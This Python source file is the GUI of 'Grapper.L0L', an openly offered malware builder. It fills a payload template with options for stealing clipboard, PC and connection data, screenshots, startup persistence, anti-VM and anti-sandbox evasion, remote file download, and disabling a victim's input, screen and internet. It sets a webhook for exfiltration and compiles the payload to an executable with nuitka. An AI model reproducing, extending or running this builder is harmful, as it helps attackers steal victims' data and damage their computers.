# Gui is still in beta
version = "2.0"
import os
try:
    import customtkinter
    import tkinter as tk
    import webbrowser
    from PIL import Image
    import requests
    from tkinter import messagebox
    from tkinter import scrolledtext
    from colorama import Fore
    import nuitka
    import sys
    import shutil
    import time
    import ctypes
except:
    os.system("title Grapper.L0L - Installing libs")
    print("Seems like u dont have required libs... installing them now")
    print("Updating pip")
    os.system("python.exe -m pip install --upgrade pip")
    for lib in ["requests", "colorama", "nuitka", "customtkinter"]:
        os.system(f"pip install {lib}")
    import customtkinter
    import tkinter as tk
    import webbrowser
    from PIL import Image
    import requests
    from tkinter import messagebox
    from tkinter import scrolledtext
    from colorama import Fore
    import nuitka
    import sys
    import shutil
    import time
    import ctypes

print("Passed libs")

red = Fore.RED
lred = Fore.LIGHTRED_EX
yellow = Fore.YELLOW
lyellow = Fore.LIGHTYELLOW_EX
green = Fore.GREEN
lgreen = Fore.LIGHTGREEN_EX
res = Fore.RESET
purple = Fore.LIGHTMAGENTA_EX
magenta = Fore.MAGENTA
black = Fore.LIGHTBLACK_EX

class auto_update:
    try:
        def get_info():
            os.system("title Grapper.L0L - Searching for updates")
            print("Searching for updates")
            r = requests.get(f"https://api.github.com/repos/R3CI/Grapper.L0L/releases/latest")
            if r.status_code == 200:
                data = r.json()
                changelog = data.get('body', '')
                version = float(data['tag_name'])
                return version, changelog
            else:
                return None, None
            
        def check_for_update(local, github, changelog):
            local = float(local)
            github = float(github)
            if local == github:
                pass
            else:
                if local < github: 
                    os.system(f"title Grapper.L0L - New version is anvaible {local} -> {github}")
                    print("Update found")
                    print(f"""{Fore.RED}
███    ██ ███████ ██     ██     ██    ██ ███████ ██████  ███████ ██  ██████  ███    ██ 
████   ██ ██      ██     ██     ██    ██ ██      ██   ██ ██      ██ ██    ██ ████   ██ 
██ ██  ██ █████   ██  █  ██     ██    ██ █████   ██████  ███████ ██ ██    ██ ██ ██  ██ 
██  ██ ██ ██      ██ ███ ██      ██  ██  ██      ██   ██      ██ ██ ██    ██ ██  ██ ██ 
██   ████ ███████  ███ ███        ████   ███████ ██   ██ ███████ ██  ██████  ██   ████  
                          
{local} -> {github}                                                                                                                                                                   
""")
                    print(f"{lred}Change log\n{changelog}")
                    input(f"\n{red}Enter to open github on the newest release")
                    webbrowser.open("https://github.com/R3CI/Grapper.L0L/releases")
                    exit()

        gh_version, changelog = get_info()
        local_version = version
        if gh_version and changelog:
            check_for_update(local_version, gh_version, changelog)
    except Exception as e: 
        input(f"Failed to check for updates")

print("Copying code...")
with open("resources/code.py", "r") as src:
    source_code = src.read()

with open("resources/build.py", "w") as des:
    des.write(source_code)
print("Code copied")
version_info = sys.version_info
os.system(f"title Grapper.L0L - Using python {version_info.major}.{version_info.minor}.{version_info.micro}")
print("Launching gui...")
class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        admin_ask = tk.BooleanVar()
        anti_vm = tk.BooleanVar()
        anti_vt = tk.BooleanVar()
        anti_arun = tk.BooleanVar()
        destruct = tk.BooleanVar()
        hide = tk.BooleanVar()
        ss = tk.BooleanVar()
        startup = tk.BooleanVar()
        con_info = tk.BooleanVar()
        pc_info = tk.BooleanVar()
        steal_clipboard = tk.BooleanVar()
        down_file = tk.BooleanVar()
        play_music = tk.BooleanVar()

        fuck_internet = tk.BooleanVar()
        black_screen = tk.BooleanVar()
        fuck_input = tk.BooleanVar()
        shortcut_spam = tk.BooleanVar()

        #self.overrideredirect(True)
        self.title("Grapper.L0L")
        self.geometry("950x550")

        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        self.logo_image = customtkinter.CTkImage(Image.open("resources/images/logo.png"), size=(50, 50))
        self.banner_image = customtkinter.CTkImage(Image.open("resources/images/banner.png"), size=(500, 150))
        self.discord_image = customtkinter.CTkImage(Image.open("resources/images/discord.png"), size=(35, 35))
        self.github_image = customtkinter.CTkImage(Image.open("resources/images/github.png"), size=(35, 35))
        self.repo_image = customtkinter.CTkImage(Image.open("resources/images/repo.png"), size=(35, 35))
        self.cmd_image = customtkinter.CTkImage(Image.open("resources/images/cmd.png"), size=(35, 35))
        self.stealing_image = customtkinter.CTkImage(Image.open("resources/images/stealing.png"), size=(35, 35))
        self.pc_fucking_image = customtkinter.CTkImage(Image.open("resources/images/pcfucking.png"), size=(35, 35))
        self.other_image = customtkinter.CTkImage(Image.open("resources/images/other.png"), size=(35, 35))
        self.build_image = customtkinter.CTkImage(Image.open("resources/images/build.png"), size=(35, 35))
        self.font = "Supernova"

        with open("resources/console.txt", "r") as f:
            content = f.read()
            if "1" in content:
                print("Hiding console")
                self.console_visible = False
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            else:
                print("Showing console")
                self.console_visible = True
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)

        # HOME FRAME
        self.home_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.home_frame.grid_columnconfigure(0, weight=1)

        self.home_frame_large_image_label = customtkinter.CTkLabel(self.home_frame, text="", image=self.banner_image)
        self.home_frame_large_image_label.grid(row=0, column=0, padx=20, pady=25)

        self.discord_button = customtkinter.CTkButton(self.home_frame, corner_radius=0, height=40, border_spacing=10, text="Discord",
            font=customtkinter.CTkFont(size=15, family=self.font),                                          
            fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("#680C0D", "#680C0D"),
            image=self.discord_image, anchor="w", command=self.open_discord)
        self.discord_button.grid(row=1, column=0, sticky="ew")

        self.github_button = customtkinter.CTkButton(self.home_frame, corner_radius=0, height=40, border_spacing=10, text="Github",
            font=customtkinter.CTkFont(size=15, family=self.font),                                         
            fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("#680C0D", "#680C0D"),
            image=self.github_image, anchor="w", command=self.open_github)
        self.github_button.grid(row=2, column=0, sticky="ew")

        self.repo_button = customtkinter.CTkButton(self.home_frame, corner_radius=0, height=40, border_spacing=10, text="Repository",
            font=customtkinter.CTkFont(size=15, family=self.font), 
            fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("#680C0D", "#680C0D"),
            image=self.repo_image, anchor="w", command=self.open_repo)
        self.repo_button.grid(row=3, column=0, sticky="ew")

        self.console_toggle_button = customtkinter.CTkButton(self.home_frame, corner_radius=0, height=40, border_spacing=10, text="Toggle console",
            font=customtkinter.CTkFont(size=15, family=self.font), 
            fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("#680C0D", "#680C0D"),
            image=self.cmd_image, anchor="w", command=self.toggle_console)
        self.console_toggle_button.grid(row=4, column=0, sticky="ew")

        # LEFT FRAME MENU
        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  Grapper.L0L", image=self.logo_image,
            compound="left", font=customtkinter.CTkFont(size=15, weight="bold", family=self.font))
        self.navigation_frame_label.grid(row=0, column=0, padx=20, pady=20)

        self.stealing_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Stealing",
            font=customtkinter.CTkFont(size=15, family=self.font), 
            fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("#76090B", "#76090B"),
            image=self.stealing_image, anchor="w", command=self.stealing_button_event)
        self.stealing_button.grid(row=1, column=0, sticky="ew")

        self.pc_fucking_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="PC Fucking",
            font=customtkinter.CTkFont(size=15, family=self.font), 
            fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("#76090B", "#76090B"),
            image=self.pc_fucking_image, anchor="w", command=self.pc_fucking_button_event)
        self.pc_fucking_button.grid(row=2, column=0, sticky="ew")

        self.other_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Other",
            font=customtkinter.CTkFont(size=15, family=self.font), 
            fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("#76090B", "#76090B"),
            image=self.other_image, anchor="w", command=self.other_button_event)
        self.other_button.grid(row=3, column=0, sticky="ew")

        self.build_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Build",
            font=customtkinter.CTkFont(size=15, family=self.font), 
            fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("#76090B", "#76090B"),
            image=self.build_image, anchor="w", command=self.build_button_event)
        self.build_button.grid(row=5, column=0, sticky="ew")

        # STEALING FRAME
        self.stealing_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")

        self.con_info_checkbox = customtkinter.CTkCheckBox(master=self.stealing_frame, fg_color="#FF0005", hover_color="#76090B", text="Connection info", variable=con_info, )
        self.con_info_checkbox.grid(row=2, column=0, padx=25, pady=10)

        self.pc_info_checkbox = customtkinter.CTkCheckBox(master=self.stealing_frame, fg_color="#FF0005", hover_color="#76090B", text="PC Info", variable=pc_info, )
        self.pc_info_checkbox.grid(row=2, column=1, padx=25, pady=10)

        self.steal_clipboard_checkbox = customtkinter.CTkCheckBox(master=self.stealing_frame, fg_color="#FF0005", hover_color="#76090B", text="Clipboard", variable=steal_clipboard, )
        self.steal_clipboard_checkbox.grid(row=2, column=2, padx=25, pady=10)

        # PC FUCKING FRAME
        self.pc_fucking_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")

        self.fuck_input_checkbox = customtkinter.CTkCheckBox(master=self.pc_fucking_frame, fg_color="#FF0005", hover_color="#76090B", text="Input disabler", variable=fuck_input)
        self.fuck_input_checkbox.grid(row=2, column=0, padx=25, pady=10)

        self.shortcut_spam_checkbox = customtkinter.CTkCheckBox(master=self.pc_fucking_frame, fg_color="#FF0005", hover_color="#76090B", text="Shortcut spammer", variable=shortcut_spam)
        self.shortcut_spam_checkbox.grid(row=2, column=1, padx=25, pady=10)

        self.black_screen_checkbox = customtkinter.CTkCheckBox(master=self.pc_fucking_frame, fg_color="#FF0005", hover_color="#76090B", text="Black screen", variable=black_screen)
        self.black_screen_checkbox.grid(row=2, column=2, padx=25, pady=10)

        self.fuck_internet_checkbox = customtkinter.CTkCheckBox(master=self.pc_fucking_frame, fg_color="#FF0005", hover_color="#76090B", text="Fuck internet", variable=fuck_internet)
        self.fuck_internet_checkbox.grid(row=2, column=3, padx=25, pady=10)

        # OTHER FRAME
        self.other_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")



        self.startup_checkbox = customtkinter.CTkCheckBox(master=self.other_frame, fg_color="#FF0005", hover_color="#76090B", text="Startup", variable=startup)
        self.startup_checkbox.grid(row=1, column=0, padx=(15, 15), pady=(10, 10))

        self.hide_checkbox = customtkinter.CTkCheckBox(master=self.other_frame, fg_color="#FF0005", hover_color="#76090B", text="Hide", variable=hide)
        self.hide_checkbox.grid(row=1, column=1, padx=(15, 15), pady=(10, 10))

        self.admin_ask_checkbox = customtkinter.CTkCheckBox(master=self.other_frame, fg_color="#FF0005", hover_color="#76090B", text="Admin ask", variable=admin_ask)
        self.admin_ask_checkbox.grid(row=1, column=2, padx=(15, 15), pady=(10, 10))

        self.anti_vm_checkbox = customtkinter.CTkCheckBox(master=self.other_frame, fg_color="#FF0005", hover_color="#76090B", text="Anti VM", variable=anti_vm)
        self.anti_vm_checkbox.grid(row=1, column=3, padx=25, pady=10)

        self.anti_vt_checkbox = customtkinter.CTkCheckBox(master=self.other_frame, fg_color="#FF0005", hover_color="#76090B", text="Anti virustotal", variable=anti_vt)
        self.anti_vt_checkbox.grid(row=1, column=4, padx=25, pady=10)

        self.anti_arun_checkbox = customtkinter.CTkCheckBox(master=self.other_frame, fg_color="#FF0005", hover_color="#76090B", text="Anti any.run", variable=anti_arun)
        self.anti_arun_checkbox.grid(row=2, column=0, padx=25, pady=10)

        self.destruct_checkbox = customtkinter.CTkCheckBox(master=self.other_frame, fg_color="#FF0005", hover_color="#76090B", text="Auto destruct", variable=destruct)
        self.destruct_checkbox.grid(row=2, column=1, padx=25, pady=10)
    
        self.ss_checkbox = customtkinter.CTkCheckBox(master=self.other_frame, fg_color="#FF0005", hover_color="#76090B", text="Screenshoot", variable=ss)
        self.ss_checkbox.grid(row=2, column=2, padx=25, pady=10)

        self.down_file_checkbox = customtkinter.CTkCheckBox(master=self.other_frame, fg_color="#FF0005", hover_color="#76090B", text="Download file", variable=down_file)
        self.down_file_checkbox.grid(row=2, column=3, padx=25, pady=10)

        self.play_music_checkbox = customtkinter.CTkCheckBox(master=self.other_frame, fg_color="#FF0005", hover_color="#76090B", text="Music player", variable=play_music)
        self.play_music_checkbox.grid(row=2, column=4, padx=25, pady=10)

        # BUILD FRAME
        self.build_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")

        self.webhook_entry = customtkinter.CTkEntry(master=self.build_frame, placeholder_text="Webhook", width=575)
        self.webhook_entry.grid(row=1, column=1, columnspan=1, padx=(20, 0), pady=(20, 20))

        self.webhook_check_button = customtkinter.CTkButton(master=self.build_frame, fg_color="transparent", border_width=2, text="Check", command=self.check_wb)
        self.webhook_check_button.grid(row=1, column=2, padx=(20, 20), pady=(20, 20), sticky="e")

        self.build_logs = customtkinter.CTkTextbox(master=self.build_frame, fg_color="transparent", border_width=2, width=550, height=400)
        self.build_logs.grid(row=3, column=1, padx=(20, 20), pady=(20, 20), sticky="wn")

        self.build_button = customtkinter.CTkButton(master=self.build_frame, fg_color="transparent", border_width=2, text="Build", command=self.build)
        self.build_button.grid(row=5, column=2, padx=(15, 20), pady=(0, 0), sticky="s")

        self.select_frame_by_name("Home")

    def select_frame_by_name(self, name):
        self.stealing_button.configure(fg_color=("#320304", "#320304") if name == "Stealing" else "transparent")
        self.pc_fucking_button.configure(fg_color=("#320304", "#320304") if name == "PC Fucking" else "transparent")
        self.other_button.configure(fg_color=("#320304", "#320304") if name == "Other" else "transparent")
        self.build_button.configure(fg_color=("#320304", "#320304") if name == "Build" else "transparent")

        if name == "Home":
            print("Home tab")
            self.home_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.home_frame.grid_forget()
        if name == "Stealing":
            print("Stealing tab")
            self.stealing_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.stealing_frame.grid_forget()
        if name == "PC Fucking":
            print("PC Fucking tab")
            self.pc_fucking_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.pc_fucking_frame.grid_forget()
        if name == "Other":
            print("Other tab")
            self.other_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.other_frame.grid_forget()
        if name == "Build":
            print("Build tab")
            self.build_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.build_frame.grid_forget()

    def stealing_button_event(self):
        self.select_frame_by_name("Stealing")

    def pc_fucking_button_event(self):
        self.select_frame_by_name("PC Fucking")

    def other_button_event(self):
        self.select_frame_by_name("Other")

    def build_button_event(self):
        self.select_frame_by_name("Build")

    def open_discord(self):
        print(f"Discord opened https://discord.gg/qSqDbYEqrW")
        webbrowser.open("https://discord.gg/qSqDbYEqrW")

    def open_github(self):
        print(f"Github opened https://github.com/R3CI")
        webbrowser.open("https://github.com/R3CI")

    def open_repo(self):
        print(f"Repo opened https://github.com/R3CI/Grapper.L0L")
        webbrowser.open("https://github.com/R3CI/Grapper.L0L")

    def check_wb(self):
        try:
            wb = self.webhook_entry.get()
            r = requests.head(wb)
            if r.status_code == 200:
                messagebox.showinfo("Grapper.l0l", "Webhook is valid")
                print(f"Valid webhook {wb} {r.status_code}")
            else:
                messagebox.showerror("Grapper.l0l", f"Webhook is invalid {r.status_code}")
                print(f"Invalid webhook {wb} {r.status_code}")
        except Exception as e:
            messagebox.showerror("Grapper.l0l", f"Error while checking webhook {e}")
            print(f"Error on wb check {e}")

    def toggle_console(self):
        if self.console_visible:
            self.hide_console()
        else:
            self.show_console()

    def hide_console(self):
        print("Hiding console")
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        self.console_visible = False
        with open("resources/console.txt", "w") as f:
            f.write("1")

    def show_console(self):
        print("Showing console")
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
        self.console_visible = True
        with open("resources/console.txt", "w") as f:
            f.write("0")

    def log_build(self, msg):
        self.build_logs.insert("1.0", f"{msg}\n")
        print(f"BUILD LOG: {msg}")

    def build(self):
        self.log_build("Setting config...")

        def update(opt):
            with open("resources/build.py", "r") as f:
                content = f.read()
            new_content = content.replace(f"{opt} = False", f"{opt} = True")
            with open("resources/build.py", "w") as f:
                f.write(new_content)
                self.log_build(f"{opt} is now true")

        wb = self.webhook_entry.get()
        with open("resources/build.py", "r") as f:
            content = f.read()
        new_content = content.replace(f"wb = ''", f"wb = {wb}")
        with open("resources/build.py", "w") as f:
            f.write(new_content)
            self.log_build(f"wb is now set {wb}")

        if self.admin_ask_checkbox.get() == 1:
            update("admin_ask")

        if self.anti_vm_checkbox.get() == 1:
            update("anti_vm")

        if self.anti_vt_checkbox.get() == 1:
            update("anti_vt")

        if self.anti_arun_checkbox.get() == 1:
            update("anti_arun")

        if self.destruct_checkbox.get() == 1:
            update("destruct")

        if self.hide_checkbox.get() == 1:
            update("hide")

        if self.ss_checkbox.get() == 1:
            update("ss")

        if self.startup_checkbox.get() == 1:
            update("startup")

        if self.con_info_checkbox.get() == 1:
            update("con_info")

        if self.pc_info_checkbox.get() == 1:
            update("pc_info")

        if self.steal_clipboard_checkbox.get() == 1:
            update("steal_clipboard")

        if self.down_file_checkbox.get() == "1":
            messagebox.showinfo("Grapper.l0l", "Check console u will be asked for info about file downloader")
            update("down_file")
            url = input("URL (file downloader): ")
            with open("resources/build.py", "r") as f:
                content = f.read()
            new_content = content.replace("down_file_url = ''", f"down_file_url = '{url}'")
            with open("resources/build.py", "w") as f:
                f.write(new_content)
                self.log_build(f"File downloader url is now set to {url}")
            with open("resources/build.py", "r") as f:
                content = f.read()
                new_content = content.replace("down_file_path = ''", f"down_file_path = 'dir.startup'")
            with open("resources/build.py", "w") as f:
                f.write(new_content)

        if self.play_music_checkbox.get() == "1":
            messagebox.showinfo("Grapper.l0l", "Check console u will be asked for info about music player")
            update("play_music")
            url = input("URL (music player): ")
            with open("resources/build.py", "r") as f:
                content = f.read()
                new_content = content.replace("music_url = ''", f"music_url = '{url}'")
            with open("resources/build.py", "w") as f:
                f.write(new_content)

        if self.fuck_internet_checkbox.get() == "1":
            update("fuck_internet")

        if self.black_screen_checkbox.get() == 1:
            update("black_screen")

        if self.fuck_input_checkbox.get() == 1:
            update("fuck_input")

        if self.shortcut_spam_checkbox.get() == 1:
            update("shortcut_spam")

        self.log_build("Building began... (more info in cmd window) (this will take a while)")
        self.log_build("The buildier may seem like its crashing but it isnt dont worry!")
        self.log_build("COMPILER MAY ONLY BE USED USING THE ACTUAL FILE EDITORS WONT WORK")
        messagebox.showinfo("Grapper.l0l", "The gui may seem like its crashing but dont worry its normal")
        try:
            self.log_build("Removing old build...")
            os.remove("build/build.exe")
        except:
            self.log_build("Old build not found")
            pass
        if self.hide_checkbox.get() == "1":
            self.log_build("Compiling with nuitka (with hide)")
            os.system("nuitka --follow-imports --disable-console resources/build.py")
        else:
            self.log_build("Compiling with nuitka")
            os.system("nuitka --follow-imports resources/build.py")
        self.log_build("Removing files")
        self.log_build("Removing build.cmd")
        os.remove("build.cmd")
        self.log_build("Removing build.build")
        shutil.rmtree("build.build") 
        self.log_build("Copying build.exe to build")
        shutil.copy("build.exe", "build")
        self.log_build("Removing build.exe from main folder") 
        os.remove("build.exe")
        self.log_build("Starting build folder") 
        os.startfile("build")
        print(f"""{Fore.RED}
██████   ██████   █████  ██████  ███████ ██████     ██       ██████  ██      
██       ██   ██ ██   ██ ██   ██ ██      ██   ██    ██      ██  ████ ██      
██   ███ ██████  ███████ ██████  █████   ██████     ██      ██ ██ ██ ██      
██    ██ ██   ██ ██   ██ ██      ██      ██   ██    ██      ████  ██ ██      
██████   ██   ██ ██   ██ ██      ███████ ██   ██ ██ ███████  ██████  ███████                                                                            
""")
        messagebox.showinfo("Grapper.l0l", "Build made!")
        print("Build made")


if __name__ == "__main__":
    app = App()
    app.mainloop()
